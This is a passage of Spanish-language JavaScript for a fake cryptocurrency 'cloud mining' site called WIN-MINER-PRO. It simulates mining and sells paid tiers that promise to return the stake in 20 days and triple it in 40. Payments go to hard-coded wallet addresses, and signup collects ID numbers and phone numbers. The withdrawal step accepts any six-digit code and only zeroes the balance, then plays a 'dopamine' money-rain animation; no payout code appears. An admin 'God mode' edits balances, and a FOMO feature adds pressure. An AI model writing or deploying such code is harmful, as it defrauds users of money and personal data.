// ==========================================
        // CONFIGURACIÓN DE FIREBASE
        // ==========================================
        const firebaseConfig = {
            apiKey: "AIzaSyB0F4nt2vcSSqMeVytcTLPXyo33K9VLgjQ",
            authDomain: "mineriabtc-b1c78.firebaseapp.com",
            databaseURL: "https://mineriabtc-b1c78-default-rtdb.firebaseio.com",
            projectId: "mineriabtc-b1c78",
            storageBucket: "mineriabtc-b1c78.firebasestorage.app",
            messagingSenderId: "622802944773",
            appId: "1:622802944773:web:242b0036a77f93d3c22d6c"
        };
        
        let isFirebaseActive = false;
        try {
            firebase.initializeApp(firebaseConfig);
            isFirebaseActive = true;
            console.log("Firebase Conectado.");
        } catch(e) {
            console.warn("Firebase no configurado. Operando en modo LocalStorage temporalmente.");
        }

        // ==========================================
       // ESTADO GLOBAL Y CONFIGURACIONES
        // ==========================================
        let user = null;
        let selectedTierForPayment = null;
        let currentHistoryPage = 1;
        const itemsPerPage = 10;
        let withdrawAmountTemp = 0;

        const cryptoData = { 
            'BTC': { price: 69150, symbol: 'BTC', multiplier: 1, wdMultiplier: 1 }, 
            'LTC': { price: 85.50, symbol: 'LTC', multiplier: 800, wdMultiplier: 4 }, 
            'DASH': { price: 32.10, symbol: 'DASH', multiplier: 2150, wdMultiplier: 8 } 
        };
        const paymentWallets = { 'USDT': 'TNCFjTLYp63k2ocAooAnTUJbodaWLrRQhh', 'BTC': '1GXrmr4teSrfGTp294YjG11Zk6q7zDLrtv', 'ETH': '0x02a8f8567e2a3ed68b51de71d25f23a27bb7cb7f' };

        function getMinWithdrawUSD(tierId, coinSymbol) {
            const t = tiers.find(x => x.id === tierId) || tiers[0];
            const multiplier = cryptoData[coinSymbol] ? cryptoData[coinSymbol].wdMultiplier : 1;
            return t.minWithdrawUSD * multiplier;
        }
        
        // MATEMÁTICA ESTRICTA APLICADA (ROI = Retorno en 20 Días, Ganancia en 30+, Min Retiro en 50 días)
        const tiers = [
            { id: 1, name: "Básico Sim Rig", hashrate: "15.0 TH/s", baseBtcPerSec: 0.000000000008, costUSD: 0, minWithdrawUSD: 10, needleRange: [0, 40], playbackSpeed: 1, gasFee: 0.15, specs: "Minado gratuito y constante. Retiro a largo plazo." },
            { id: 2, name: "ProMiner X", hashrate: "90.0 TH/s", baseBtcPerSec: 0.000000000083, costUSD: 10, minWithdrawUSD: 25, needleRange: [45, 80], videoSrc: "planprominerX.mp4", playbackSpeed: 1.5, gasFee: 0.10, specs: "ROI: 20 días | X2 en 30 días | X3 en 40 días" },
            { id: 3, name: "AntCluster 1200", hashrate: "280 TH/s", baseBtcPerSec: 0.000000000167, costUSD: 20, minWithdrawUSD: 50, needleRange: [85, 130], videoSrc: "planantcluster.mp4", playbackSpeed: 2.5, gasFee: 0.05, specs: "ROI: 20 días | Alta eficiencia energética y rentabilidad" },
            { id: 4, name: "Quantum H-Core", hashrate: "1500 TH/s", baseBtcPerSec: 0.000000000293, costUSD: 35, minWithdrawUSD: 87.5, needleRange: [135, 180], videoSrc: "plancuantun.mp4", playbackSpeed: 4.0, gasFee: 0.00, specs: "ROI: 20 días | Fuerza bruta cuántica con 0% Gas Fee" }
        ];

        function showToast(message) { 
            const c = document.getElementById('toast-container'); 
            const t = document.createElement('div'); 
            t.className = 'toast'; 
            t.innerHTML = message; 
            c.appendChild(t); 
            setTimeout(() => t.remove(), 4000); 
        }

        // ==========================================
        // FUNCIONES DE INICIALIZACIÓN Y RENDERIZADO
        // ==========================================
        
        function initApp() {
            updateWithdrawNetworks();
            
            if(user && user.savedWallet) {
                const wdSelect = document.getElementById('wdNetworkSelect');
                if([...wdSelect.options].some(opt => opt.value === user.savedWallet.network)) {
                    wdSelect.value = user.savedWallet.network;
                }
                document.getElementById('wdWalletAddress').value = user.savedWallet.address;
            }
            
            if(user) {
                changeCoin(user.activeCoin || 'BTC'); 
                activateTier(user.tierId || 1); 
                startMiningLoop();
                if(typeof renderHistory === 'function') renderHistory(); // Renderizar tabla al cargar
            }
            startFomoSystem();

            // ESCUCHADORES EN TIEMPO REAL FIREBASE (Admin Commands)
            if (isFirebaseActive && firebase.auth().currentUser) {
                const uid = firebase.auth().currentUser.uid;
                
                // 1. Escuchar botón de Mantenimiento del Admin
                firebase.database().ref('settings/maintenance').on('value', snap => {
                    const isOffline = snap.val();
                    const overlay = document.getElementById('maintenanceOverlay');
                    if(overlay) overlay.style.display = isOffline ? 'flex' : 'none';
                });

                // 2. Escuchar cambios o Eliminación del usuario
                firebase.database().ref('users/' + uid).on('value', snap => {
                    if(!snap.exists()) {
                        // Usuario fue eliminado por el Admin
                        firebase.auth().signOut().then(() => {
                            alert("ACCESO DENEGADO.\nSu cuenta ha sido eliminada por el administrador.");
                            window.location.reload();
                        });
                    } else {
                        const dbUser = snap.val();
                        
                        // Detectar si el Admin aprobó un plan que estaba procesándose (Auto-Desbloqueo)
                        if(user.pendingTiers && user.pendingTiers.length > 0) {
                            if(dbUser.unlockedTiers) {
                                user.pendingTiers.forEach(pendingTierId => {
                                    if(dbUser.unlockedTiers.includes(pendingTierId)) {
                                        showToast(`🎉 <b>¡Minero Aprobado!</b><br>Su pago fue verificado y el minero se ha activado automáticamente.`);
                                        user.pendingTiers = user.pendingTiers.filter(id => id !== pendingTierId); 
                                        activateTier(pendingTierId); // Activa al instante
                                    }
                                });
                            }
                        }

                        // NUEVO: Detectar si el Admin inyectó o dedujo saldo (Modo Dios)
                        if(dbUser.adminBonus !== undefined && dbUser.adminBonus !== null) {
                            user.balances[user.activeCoin] += dbUser.adminBonus;
                            if(user.balances[user.activeCoin] < 0) user.balances[user.activeCoin] = 0; 
                            
                            const esSuma = dbUser.adminBonus > 0;
                            showToast(esSuma ? `💰 <b>Bono Acreditado</b><br>El sistema ha inyectado saldo a tu cuenta.` : `⚠️ <b>Ajuste de Saldo</b><br>Se ha realizado una deducción administrativa en tu cuenta.`);
                            
                            // Borrar el bono de la BD para no sumarlo en bucle infinito
                            firebase.database().ref('users/' + uid + '/adminBonus').remove();
                        }

                        user.unlockedTiers = dbUser.unlockedTiers || [1];
                        user.tierId = dbUser.tierId || 1;
                        renderTiers(); // Refrescar los candados
                    }
                });
            }
        }

function renderTiers() {
            const container = document.getElementById('tiersContainer');
            if(!container) return;
            container.innerHTML = '';
            
            if (!user || !user.unlockedTiers) return;

            if(!user.pendingTiers) user.pendingTiers = [];

            tiers.forEach(tier => {
                const isCurrent = user.tierId === tier.id;
                const isUnlocked = user.unlockedTiers.includes(tier.id);
                const isPending = user.pendingTiers.includes(tier.id); // Validar si está en proceso

                const card = document.createElement('div');
                card.className = `tier-card ${isCurrent ? 'active' : ''} ${(!isUnlocked && !isCurrent && !isPending) ? 'locked' : ''}`;
                
                if(!isCurrent && !isPending) { 
                    card.onclick = () => isUnlocked ? activateTier(tier.id) : openPaymentModal(tier.id); 
                }

                const currentMinWd = getMinWithdrawUSD(tier.id, user ? user.activeCoin : 'BTC');
                
                let pendingOverlayHtml = '';
                if(isPending) {
                    pendingOverlayHtml = `
                        <div class="tier-processing-overlay">
                            <div class="payment-spinner"></div>
                            <p>Procesando<br>Transacción...</p>
                        </div>
                    `;
                }

              card.innerHTML = `
                    ${pendingOverlayHtml}
                    <h3>${tier.name}</h3>
                    <div style="font-size:11px; color:var(--text-muted); margin-bottom:10px; display: flex; justify-content: space-between;">
                        <span>Retiro Mín: <b style="color:white;">$${currentMinWd.toFixed(2)}</b></span>
                        <span style="color:var(--danger); font-weight:bold;">Gas Fee: ${(tier.gasFee * 100)}%</span>
                    </div>
                    <div class="tier-stats" style="background: rgba(0,0,0,0.4); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02); margin-bottom: 10px;">
                        <p style="font-size:12px; color:var(--text-main); margin-bottom: 6px;">Poder de Hash: <strong style="color:var(--primary); font-size: 14px;">${tier.hashrate}</strong></p>
                        <p style="font-size:10px; color:#3b82f6; font-style: italic; line-height: 1.4;">${tier.specs}</p>
                    </div>
                    <div class="tier-cost-line">
                        $${tier.costUSD.toLocaleString()} USD
                        ${!isCurrent && !isPending ? '<button class="tier-cost-btn">Adquirir</button>' : ''}
                    </div>
                `;
                container.appendChild(card);
            });
        }
        function activateTier(tierId) {
            if(!user) return;
            user.tierId = tierId;
            const newTier = tiers.find(t => t.id === tierId);
            if(!newTier) return;

            document.body.setAttribute('data-tier', tierId);
            
            const minerVideo = document.getElementById('minerVideo');
            const basicCard = document.getElementById('basicPlanCard');
            const videoMsg = document.getElementById('videoErrorMsg');

            if(minerVideo && basicCard) {
                if (tierId === 1) {
                    minerVideo.style.display = 'none'; 
                    if(videoMsg) videoMsg.style.display = 'none'; 
                    basicCard.style.display = 'block';
                } else {
                    basicCard.style.display = 'none';
                    minerVideo.style.display = 'block';
                    if (minerVideo.getAttribute('src') !== newTier.videoSrc) {
                        minerVideo.setAttribute('src', newTier.videoSrc); 
                        minerVideo.load();
                        minerVideo.play().then(() => { minerVideo.playbackRate = newTier.playbackSpeed; }).catch(e => console.log("Auto-play prevenido."));
                    } else { 
                        minerVideo.playbackRate = newTier.playbackSpeed; 
                    }
                }
            }
            
            const hashDisplay = document.getElementById('hashrateDisplay');
            const rateDisplay = document.getElementById('rateDisplay');
            const activePlan = document.getElementById('activePlanDisplay');
            const gasFeeDisp = document.getElementById('gasFeeDisplay');

            if(hashDisplay) hashDisplay.innerText = newTier.hashrate;
            if(rateDisplay && user.activeCoin && cryptoData[user.activeCoin]) rateDisplay.innerText = `${(newTier.baseBtcPerSec * cryptoData[user.activeCoin].multiplier).toFixed(10)} ${user.activeCoin}/s`;
            if(activePlan) activePlan.innerHTML = `Rig: <span style="color:var(--primary)">${newTier.name}</span>`;
            if(gasFeeDisp) gasFeeDisp.innerText = `Comisión de Red (Gas Fee): ${(newTier.gasFee * 100)}%`;
            
            renderTiers(); 
        }

        function logoutUser() {
            if(isFirebaseActive) {
                firebase.auth().signOut().then(() => {
                    window.location.reload(); // Recarga la página para volver a mostrar el login
                });
            } else {
                window.location.reload();
            }
        }

    // --- SISTEMA DE LOGIN Y REGISTRO ---
        let isLoginMode = true;
        
       function toggleAuthMode() {
            isLoginMode = !isLoginMode;
            const btn = document.getElementById('authActionButton');
            const promptTxt = document.getElementById('authSwitchPrompt');
            const switchBtn = document.getElementById('authSwitchBtn');
            const title = document.getElementById('authTitle');
            const regFields = document.querySelectorAll('.register-only');
            const errorMsg = document.getElementById('authErrorMsg');
            const tcContainer = document.getElementById('tcContainer');
            
            errorMsg.style.display = "none";
            
           if(isLoginMode) {
                title.innerText = "WIN-MINER-PRO";
                btn.innerText = "Iniciar Sesión";
                if(promptTxt) promptTxt.innerText = "¿Aún no tienes una cuenta de inversor?";
                if(switchBtn) switchBtn.innerText = "Crear Cuenta Ahora ➔";
                regFields.forEach(f => f.style.display = 'none');
                if(tcContainer) tcContainer.style.display = 'none';
            } else {
                title.innerText = "Registro de Inversor";
                btn.innerText = "Registrar";
                if(promptTxt) promptTxt.innerText = "¿Ya posees una cuenta registrada?";
                if(switchBtn) switchBtn.innerText = "Iniciar Sesión ➔";
                regFields.forEach(f => f.style.display = 'block');
                if(tcContainer) tcContainer.style.display = 'flex';
            }
        }

        function loginUser() {
            const email = document.getElementById('authEmail').value;
            const pass = document.getElementById('authPassword').value;
            
            // Se capturan los nuevos campos
            const name = document.getElementById('authName') ? document.getElementById('authName').value : "";
            const lastName = document.getElementById('authLastName') ? document.getElementById('authLastName').value : "";
            const dni = document.getElementById('authDni') ? document.getElementById('authDni').value : "";
            const phone = document.getElementById('authPhone') ? document.getElementById('authPhone').value : "";
            const tcCheckbox = document.getElementById('tcCheckbox');
            
            const errorMsg = document.getElementById('authErrorMsg');
            const spinner = document.getElementById('authSpinner');
            
            errorMsg.style.display = "none";

            // Validación de Términos y Condiciones
            if(!isLoginMode && tcCheckbox && !tcCheckbox.checked) {
                errorMsg.innerText = "ATENCIÓN: Es obligatorio leer y aceptar los Términos y Condiciones Legales para operar.";
                errorMsg.style.display = "block";
                return;
            }
            
            // Validación ampliada de campos requeridos (KYC)
            if(email.length < 5 || pass.length < 6 || (!isLoginMode && (name.length < 2 || lastName.length < 2 || dni.length < 5 || phone.length < 6))) {
                errorMsg.innerText = "Por favor, llene todos los campos requeridos con información verídica y verificable (KYC).";
                errorMsg.style.display = "block";
                return;
            }

            // Ocultar inputs para mostrar el escaner ocupando todo el espacio
            document.querySelectorAll('.auth-input').forEach(el => el.style.display = 'none');
            document.getElementById('authActionButton').style.display = 'none';
            document.querySelector('.auth-switch').style.display = 'none';
            if(document.getElementById('tcContainer')) document.getElementById('tcContainer').style.display = 'none';
            
            // Mostrar la nueva interfaz gigante
            document.getElementById('verificationBlock').style.display = 'flex';
            document.getElementById('verifStatusTitle').innerText = "ENCRIPTANDO...";
            document.getElementById('verifStatusDesc').innerText = "Estableciendo conexión cifrada con el servidor.";

            if(isFirebaseActive) {
                if(isLoginMode) {
                    firebase.auth().signInWithEmailAndPassword(email, pass)
                        .then((userCredential) => { loadUserData(userCredential.user.uid, email); })
                        .catch((error) => { 
                            // Restaurar UI en caso de error para permitir intentar de nuevo
                            document.querySelectorAll('.auth-input').forEach(el => {
                                if (isLoginMode && el.classList.contains('register-only')) return;
                                el.style.display = 'block';
                            });
                            document.getElementById('authActionButton').style.display = 'block';
                            document.querySelector('.auth-switch').style.display = 'block';
                            document.getElementById('verificationBlock').style.display = 'none';
                            
                            if(spinner) spinner.style.display = "none"; 
                            errorMsg.innerText = error.message; 
                            errorMsg.style.display = "block"; 
                        });
                } else {
                    firebase.auth().createUserWithEmailAndPassword(email, pass)
                        .then((userCredential) => { 
                            const userIdNum = Math.floor(Math.random() * 900000) + 100000;
                            const newId = `ID-${userIdNum}`;
                            loadUserData(userCredential.user.uid, email, name, lastName, newId, dni, phone); 
                        })
                        .catch((error) => { 
                            // Restaurar UI en caso de error
                            document.querySelectorAll('.auth-input').forEach(el => el.style.display = 'block');
                            document.getElementById('authActionButton').style.display = 'block';
                            document.querySelector('.auth-switch').style.display = 'block';
                            document.getElementById('tcContainer').style.display = 'flex';
                            document.getElementById('verificationBlock').style.display = 'none';

                            if(spinner) spinner.style.display = "none"; 
                            errorMsg.innerText = error.message; 
                            errorMsg.style.display = "block"; 
                        });
                }
            } else {
                // Bypass si firebase falla por red
                if(spinner) spinner.style.display = "none";
                document.getElementById('authOverlay').style.display = "none";
                initApp();
            }
        }

      function loadUserData(uid, email, name = "", lastName = "", newId = null, dni = "", phone = "") {
            const spinner = document.getElementById('authSpinner');
            const errorMsg = document.getElementById('authErrorMsg');
            const authSub = document.getElementById('authSubtitle');
            
            firebase.database().ref('users/' + uid).once('value').then((snapshot) => {
                if(snapshot.exists()) {
                    user = snapshot.val();
                    if(!user.unlockedTiers) user.unlockedTiers = [1];
                    if(!user.systemHistory) user.systemHistory = [];
                    if(!user.balances) user.balances = { BTC: 0, LTC: 0, DASH: 0 };
                    if(!user.activeCoin) user.activeCoin = 'BTC';
                   // NUEVO: Variables para mecánicas avanzadas
                    if(user.minerCondition === undefined) user.minerCondition = 100;
                    if(user.bonusHashrate === undefined) user.bonusHashrate = 0;
                    if(user.lastSpinDate === undefined) user.lastSpinDate = 0;
                    if(user.referrals === undefined) user.referrals = { lvl1: 0, lvl2: 0, lvl3: 0, earn1: 0, earn2: 0, earn3: 0 };
                } else {
                    // FIX CRÍTICO: Construimos el objeto directamente aquí para evitar que el script se rompa
                    user = {
                        email: email,
                        nombre: name,
                        apellido: lastName,
                        dni: dni,
                        telefono: phone,
                        idUsuario: newId,
                        status: 'pending', // Fundamental para que el admin lo reciba en estado "Pendiente"
                        balances: { BTC: 0, LTC: 0, DASH: 0 },
                        tierId: 1,
                        unlockedTiers: [1],
                        activeCoin: 'BTC',
                        systemHistory: [],
                        savedWallet: null,
                        boostUntil: 0,
                       // NUEVO: Variables iniciales
                        minerCondition: 100,
                        bonusHashrate: 0,
                        lastSpinDate: 0,
                        referrals: { lvl1: 0, lvl2: 0, lvl3: 0, earn1: 0, earn2: 0, earn3: 0 }
                    };
                    // Esta es la línea que envía los datos a la Base de Datos para que el Admin los pueda ver
                    firebase.database().ref('users/' + uid).set(user);
                }
                
                if(user.status === 'pending') {
                    // Ocultar TODO lo demás para que el escáner se apropie del 100% del espacio
                    document.getElementById('authTitle').style.display = 'none';
                    document.getElementById('authSubtitle').style.display = 'none';
                    document.querySelectorAll('.auth-input').forEach(f => f.style.display = 'none');
                    document.getElementById('authActionButton').style.display = 'none';
                    document.querySelector('.auth-switch').style.display = 'none';
                    const tcCont = document.getElementById('tcContainer');
                    if(tcCont) tcCont.style.display = 'none';
                    
                    // Configurar y mostrar el bloque gigante
                    document.getElementById('verificationBlock').style.display = 'flex';
                    const vTitle = document.getElementById('verifStatusTitle');
                    const vDesc = document.getElementById('verifStatusDesc');
                    
                    vTitle.innerText = "ESPERANDO APROBACIÓN ROOT";
                    vDesc.innerHTML = "Su identidad está siendo verificada por el Administrador.<br><br><span style='color:var(--warning); font-size:11px; font-weight:bold;'>BLOQUEO DE SEGURIDAD ACTIVADO.<br>NO CIERRE ESTA PESTAÑA.</span>";
                    
                    // ESCUCHA EN TIEMPO REAL (Aprobación, Rechazo o Eliminación)
                    firebase.database().ref('users/' + uid + '/status').on('value', (statusSnap) => {
                        const currentStatus = statusSnap.val();
                        if(currentStatus === 'approved') {
                            user.status = 'approved';
                            vTitle.innerText = "ACCESO CONCEDIDO";
                            vDesc.innerText = "Sincronizando panel de minería...";
                            firebase.database().ref('users/' + uid + '/status').off(); // apagar listener
                            
                            setTimeout(() => {
                                document.getElementById('authOverlay').style.display = "none";
                                if(typeof initApp === "function") initApp();
                            }, 1500); // Pequeño delay de transición para que se vea el mensaje de éxito
                            
                        } else if(currentStatus === 'rejected') {
                            vTitle.innerText = "ACCESO DENEGADO";
                            vTitle.style.color = "var(--danger)";
                            vTitle.style.textShadow = "0 0 15px rgba(239, 68, 68, 0.6)";
                            vDesc.innerHTML = "El administrador ha rechazado permanentemente su solicitud de ingreso por inconsistencia de datos KYC.";
                            
                            // Parar animaciones y cambiar todo a ROJO
                            document.getElementById('tsRing1').style.animation = 'none';
                            document.getElementById('tsRing1').style.borderColor = 'transparent transparent var(--danger) var(--danger)';
                            document.getElementById('tsRing2').style.animation = 'none';
                            document.getElementById('tsCore').style.background = 'var(--danger)';
                            document.getElementById('tsCore').style.boxShadow = '0 0 30px var(--danger)';
                            document.getElementById('tsCore').innerText = '✖';
                            
                        } else if(currentStatus === null) {
                            vTitle.innerText = "CUENTA ELIMINADA";
                            vTitle.style.color = "var(--danger)";
                            vDesc.innerHTML = "Su registro fue borrado de la base de datos por violar los Términos y Condiciones.";
                            document.getElementById('tsRing1').style.animation = 'none';
                            document.getElementById('tsRing2').style.animation = 'none';
                            document.getElementById('tsCore').style.background = '#333';
                            document.getElementById('tsCore').style.boxShadow = 'none';
                        }
                    });
                } else if(user.status === 'rejected') {
                    // Si un usuario rechazado intenta iniciar sesión nuevamente
                    document.getElementById('authTitle').style.display = 'none';
                    document.getElementById('authSubtitle').style.display = 'none';
                    document.querySelectorAll('.auth-input').forEach(f => f.style.display = 'none');
                    document.getElementById('authActionButton').style.display = 'none';
                    document.querySelector('.auth-switch').style.display = 'none';
                    const tcCont = document.getElementById('tcContainer');
                    if(tcCont) tcCont.style.display = 'none';
                    
                    document.getElementById('verificationBlock').style.display = 'flex';
                    document.getElementById('verifStatusTitle').innerText = "ACCESO DENEGADO";
                    document.getElementById('verifStatusTitle').style.color = "var(--danger)";
                    document.getElementById('verifStatusDesc').innerText = "Su cuenta se encuentra bloqueada por el servidor Root tras fallar la validación KYC.";
                    
                    document.getElementById('tsRing1').style.animation = 'none';
                    document.getElementById('tsRing2').style.animation = 'none';
                    document.getElementById('tsCore').style.background = 'var(--danger)';
                    document.getElementById('tsCore').innerText = '✖';
                } else {
                    document.getElementById('authOverlay').style.display = "none";
                    if(typeof initApp === "function") initApp();
                }
            }).catch((error) => {
                if(spinner) spinner.style.display = 'none';
                errorMsg.innerText = "Error cargando Base de Datos: " + error.message;
                errorMsg.style.display = "block";
            });
        }

        // ==========================================
        // FUNCIONES DE OPERACIÓN DEL MINERO
        // ==========================================
        function saveProgress() { 
            if(isFirebaseActive && firebase.auth().currentUser && user) {
                firebase.database().ref('users/' + firebase.auth().currentUser.uid).set(user);
            }
        }

        function changeCoin(coinSymbol) {
            if(!user || !cryptoData[coinSymbol]) return;
            user.activeCoin = coinSymbol;
            document.querySelectorAll('.crypto-btn').forEach(btn => btn.classList.remove('active'));
            const btn = document.getElementById(`btn-${coinSymbol}`);
            if(btn) btn.classList.add('active');
            
            document.getElementById('balanceLabel').innerText = `Saldo Minado (${coinSymbol})`;
            
            const cardFront = document.querySelector('#basicPlanCard .card-front');
            if(cardFront) cardFront.innerText = coinSymbol === 'BTC' ? '₿' : (coinSymbol === 'LTC' ? 'Ł' : 'D');
            
            updateWithdrawNetworks();
            
           const currentTier = tiers.find(t => t.id === user.tierId) || tiers[0];
            document.getElementById('rateDisplay').innerText = `${(currentTier.baseBtcPerSec * cryptoData[coinSymbol].multiplier).toFixed(10)} ${coinSymbol}/s`;
            saveProgress();
            renderTiers(); // Re-dibujar planes para actualizar el mínimo de retiro visualmente
        }

        const wdNetworks = { 'BTC': ['Bitcoin Network (BTC)', 'BEP20 (BSC)'], 'LTC': ['Litecoin Network', 'BEP20 (BSC)'], 'DASH': ['Dash Network'], 'USDT': ['TRC20 (Tron)', 'ERC20 (Ethereum)', 'BEP20 (BSC)', 'Polygon'] };
        
        function updateWithdrawNetworks() {
            if(!user) return;
            const crypto = user.activeCoin;
            const netSelect = document.getElementById('wdNetworkSelect');
            if(!netSelect) return;
            netSelect.innerHTML = '';
            const networks = wdNetworks[crypto] || wdNetworks['USDT'];
            networks.forEach(net => { 
                const opt = document.createElement('option'); 
                opt.value = net; 
                opt.innerText = net; 
                netSelect.appendChild(opt); 
            });
        }

        function saveWithdrawMethod() {
            if(!user) return;
            const address = document.getElementById('wdWalletAddress').value.trim();
            if(address.length < 15) { showToast('⚠️ Ingrese una dirección de billetera válida.'); return; }
            user.savedWallet = { crypto: user.activeCoin, network: document.getElementById('wdNetworkSelect').value, address: address };
            saveProgress(); 
            showToast('✅ Billetera guardada exitosamente.');
        }

        function openPaymentModal(tierId) {
            selectedTierForPayment = tiers.find(t => t.id === tierId);
            if(!selectedTierForPayment) return;
            document.getElementById('modalPlanName').innerText = `Desbloquear ${selectedTierForPayment.name}`;
            document.getElementById('modalPlanCost').innerText = selectedTierForPayment.costUSD.toLocaleString();
            
            document.getElementById('paymentStatusArea').style.display = 'none';
            document.getElementById('tfaArea').style.display = 'none';
            document.getElementById('adArea').style.display = 'none';
            
            document.getElementById('paymentInputArea').style.display = 'block';
            document.getElementById('paymentOverlay').style.display = 'flex';
            updateWalletAddressModal();
        }

        function closeModal() { document.getElementById('paymentOverlay').style.display = 'none'; selectedTierForPayment = null; }
        
        function updateWalletAddressModal() { 
            const select = document.getElementById('cryptoNetworkSelect');
            const display = document.getElementById('walletAddressDisplayModal');
            if(select && display) display.value = paymentWallets[select.value] || ""; 
        }

     function processPayment() {
            document.getElementById('paymentInputArea').style.display = 'none';
            document.getElementById('paymentStatusArea').style.display = 'block';
            
            const spinner = document.getElementById('paymentSpinner');
            const successIcon = document.getElementById('paymentSuccessIcon');
            const statusText = document.getElementById('paymentStatusText');
            
            spinner.style.display = 'block'; successIcon.style.display = 'none';
            statusText.innerHTML = `Registrando transacción en la Red...<br><span style="font-size:24px; color:#fff">$${selectedTierForPayment.costUSD.toLocaleString()} USD</span>`;
            statusText.style.color = 'var(--primary)';

            // TIEMPO EXACTO: 5 SEGUNDOS DE ESPERA EN LA RUEDA
            setTimeout(() => {
                if(!user.systemHistory) user.systemHistory = [];
                if(!user.pendingTiers) user.pendingTiers = [];

                // Agregar el ID del plan a pendiente para que se bloquee la tarjeta
                user.pendingTiers.push(selectedTierForPayment.id);

                user.systemHistory.push({ 
                    type: 'deposit_pending', 
                    detail: `Verificación pendiente: Compra de ${selectedTierForPayment.name}`, 
                    planName: selectedTierForPayment.name,
                    amount: selectedTierForPayment.costUSD.toFixed(2), 
                    date: new Date().toLocaleString(),
                    requestedTierId: selectedTierForPayment.id
                });
                
                saveProgress(); 
                if(typeof renderHistory === 'function') renderHistory(); // Evitamos el crash
                renderTiers(); // Refrescar para mostrar el overlay "Procesando"
                closeModal(); 
                showToast('⏳ <b>Pago en Revisión</b><br>Su nuevo minero se activará automáticamente al ser verificado por el administrador.');
            }, 5000);
        }

        // ==========================================
        // FUNCIONES DE HISTORIAL Y PAGINACIÓN
        // ==========================================
        function renderHistory() {
            const tbody = document.getElementById('historyTableBody');
            if(!tbody) return;
            tbody.innerHTML = '';
            
            if(!user || !user.systemHistory || user.systemHistory.length === 0) {
                tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">No hay transacciones recientes</td></tr>';
                document.getElementById('totalRecordsLabel').innerText = "0 Registros";
                return;
            }
            
            const historyReversed = [...user.systemHistory].reverse();
            document.getElementById('totalRecordsLabel').innerText = `${historyReversed.length} Registros`;
            
            const totalPages = Math.ceil(historyReversed.length / itemsPerPage) || 1;
            if(currentHistoryPage > totalPages) currentHistoryPage = totalPages;
            if(currentHistoryPage < 1) currentHistoryPage = 1;
            
            document.getElementById('pageIndicator').innerText = `Página ${currentHistoryPage} de ${totalPages}`;
            document.getElementById('btnPrevPage').disabled = currentHistoryPage === 1;
            document.getElementById('btnNextPage').disabled = currentHistoryPage === totalPages;
            
            const startIdx = (currentHistoryPage - 1) * itemsPerPage;
            const pageItems = historyReversed.slice(startIdx, startIdx + itemsPerPage);
            
            pageItems.forEach(item => {
                let typeBadge = '';
                if(item.type === 'deposit_pending') typeBadge = '<span class="badge-type" style="background:rgba(245, 158, 11, 0.2); color:#f59e0b; border:1px solid rgba(245, 158, 11, 0.4);">En Revisión</span>';
                else if(item.type === 'activation') typeBadge = '<span class="badge-type type-activation">Upgrade</span>';
                else if(item.type === 'withdraw') typeBadge = '<span class="badge-type type-withdraw">Retiro</span>';
                else typeBadge = `<span class="badge-type" style="background:rgba(255,255,255,0.1); color:white;">${item.type}</span>`;
                
                tbody.innerHTML += `
                    <tr>
                        <td>${typeBadge}</td>
                        <td>${item.detail || item.planName}</td>
                        <td style="color:var(--success); font-weight:bold;">$${item.amount}</td>
                        <td style="color:var(--text-muted);">${item.date}</td>
                    </tr>
                `;
            });
        }
        
        function changePage(dir) {
            currentHistoryPage += dir;
            renderHistory();
        }
      function watchAdForBoost() {
            if(!user) return;
            
            // 1. Abrir la página del anuncio en una nueva pestaña
            // NOTA: Reemplaza esta URL por el 'Direct Link' que te dé Adsterra o Monetag cuando te registres.
            window.open('https://www.effectivecpmnetwork.com/cdm2stes5?key=dd299ad126427e65e882db7d35341c99', '_blank');

            document.getElementById('paymentInputArea').style.display = 'none';
            document.getElementById('paymentStatusArea').style.display = 'none';
            document.getElementById('tfaArea').style.display = 'none';
            
            document.getElementById('adArea').style.display = 'block';
            document.getElementById('paymentOverlay').style.display = 'flex';
            
            let timeLeft = 15; // Tiempo que obligas al usuario a esperar que cargue el anuncio
            const timerText = document.getElementById('adTimerText');
            if(timerText) timerText.innerText = timeLeft;
            
            const adInterval = setInterval(() => {
                timeLeft--;
                if(timerText) timerText.innerText = timeLeft;
                if(timeLeft <= 0) {
                    clearInterval(adInterval);
                    user.boostUntil = Date.now() + (10 * 60 * 1000); // 10 minutos de Boost (600,000 ms)
                    saveProgress();
                    closeModal();
                    showToast('🚀 <b>Sobrecarga Exitosa</b><br>Se ha inyectado +1.05 TH/s a su rig durante 10 minutos.');
                }
            }, 1000);
        }

      function initiateWithdraw() {
            if(!user) return;
            if(!user.savedWallet || !user.savedWallet.address) {
                showToast('⚠️ Configure y guarde su Método de Retiro primero.');
                return;
            }
            const currentTier = tiers.find(t => t.id === user.tierId) || tiers[0];
            const currentUSD = user.balances[user.activeCoin] * cryptoData[user.activeCoin].price;
            
            const targetUSD = getMinWithdrawUSD(user.tierId, user.activeCoin);

            if(currentUSD < targetUSD) {
                showToast(`⚠️ <b>Saldo Insuficiente</b><br>El mínimo de retiro en ${user.activeCoin} es de $${targetUSD.toFixed(2)} USD.`);
                return;
            }

            withdrawAmountTemp = currentUSD - (currentUSD * currentTier.gasFee);

            document.getElementById('paymentInputArea').style.display = 'none';
            document.getElementById('paymentStatusArea').style.display = 'none';
            document.getElementById('adArea').style.display = 'none';
            
            document.getElementById('tfaArea').style.display = 'block';
            const tfaInp = document.getElementById('tfaCode');
            if(tfaInp) tfaInp.value = '';
            document.getElementById('paymentOverlay').style.display = 'flex';
        }

       function verify2FA() {
            const code = document.getElementById('tfaCode').value;
            if(code.length !== 6) {
                showToast("⚠️ Ingrese un código de seguridad válido de 6 dígitos.");
                return;
            }

            if(!user.systemHistory) user.systemHistory = [];
            user.balances[user.activeCoin] = 0; 
            
            user.systemHistory.push({
                type: 'withdraw',
                detail: `Retiro (${user.savedWallet.network}) a ...${user.savedWallet.address.slice(-5)}`,
                amount: withdrawAmountTemp.toFixed(2),
                date: new Date().toLocaleString()
            });

            saveProgress();
            closeModal();
            triggerMoneyRain(); // Lluvia de dólares para liberar dopamina
            showToast(`✅ <b>Retiro Autorizado (2FA)</b><br>Se han enviado $${withdrawAmountTemp.toFixed(2)} USD a su billetera.`);
        }
function turnOnMiner() {
            if(!user) return;
            user.isMinerRunning = true;
            document.getElementById('minerActivationOverlay').style.display = 'none';
            saveProgress();
            showToast('✅ Conexión establecida. Extrayendo bloques...');
        }

        let isMiningLoopActive = false;
        function startMiningLoop() {
            if(isMiningLoopActive) return;
            isMiningLoopActive = true;
            
            // Revisar si ya lo había encendido antes
